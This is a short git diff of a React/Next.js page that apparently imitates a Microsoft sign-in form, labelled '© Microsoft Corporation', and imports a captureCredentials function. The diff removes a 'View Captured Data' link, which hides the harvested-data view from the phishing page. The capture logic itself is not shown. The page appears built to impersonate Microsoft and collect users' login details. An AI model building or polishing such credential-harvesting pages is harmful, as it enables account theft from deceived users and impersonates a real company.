@@ -1,7 +1,6 @@
 'use client';
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
-import Link from 'next/link';
 
 // Make Swal available in the component
 declare const Swal: any;
@@ -64,11 +63,6 @@ export default function Home() {
           <button type="submit">Sign in</button>
           <small>© Microsoft Corporation</small>
         </form>
-        <div style={{ marginTop: '20px' }}>
-          <Link href="/data" style={{ color: '#217346', textDecoration: 'none' }}>
-            View Captured Data
-          </Link>
-        </div>
       </div>
     </>
   );
